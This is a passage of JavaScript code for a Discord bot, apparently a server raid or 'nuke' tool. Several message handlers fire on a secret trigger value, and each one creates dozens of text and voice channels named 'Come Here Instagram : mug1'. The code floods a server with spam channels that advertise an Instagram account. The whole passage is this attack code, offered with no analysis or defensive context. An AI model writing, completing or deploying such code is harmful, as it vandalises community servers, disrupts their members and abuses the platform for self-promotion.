  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
